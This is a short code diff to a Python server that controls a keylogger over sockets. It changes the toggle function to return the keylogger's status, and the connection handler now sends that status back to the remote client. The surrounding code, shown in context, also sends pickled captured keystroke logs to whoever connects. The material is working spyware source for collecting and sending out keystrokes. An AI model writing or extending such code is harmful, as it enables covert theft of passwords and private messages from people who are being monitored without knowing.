@@ -77,7 +77,9 @@ def getLogs() -> list[str]:
     return logs
 
 
-def toggleLogger() -> None:
+def toggleLogger() -> bytes:
+    """Toggles the keylogger and then returns status as bytes"""
+
     # Connect to local keylogger socket
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     conn.connect(KEYLOGGERADDR)
@@ -90,6 +92,8 @@ def toggleLogger() -> None:
     conn.send(msg_length)
     conn.send(msg.encode(FORMAT))
 
+    status: bytes = conn.recv(1024)
+    return status
 
 def handleConnection(conn: socket, addr):
     print(f"{addr} has connected!")
@@ -139,7 +143,8 @@ def handleConnection(conn: socket, addr):
                     conn.send(msg_length)
                     conn.send(pickledLogs)
                 elif msg == "toggle":
-                    toggleLogger()
+                    status = toggleLogger()
+                    conn.send(status)
 
 
 def main():
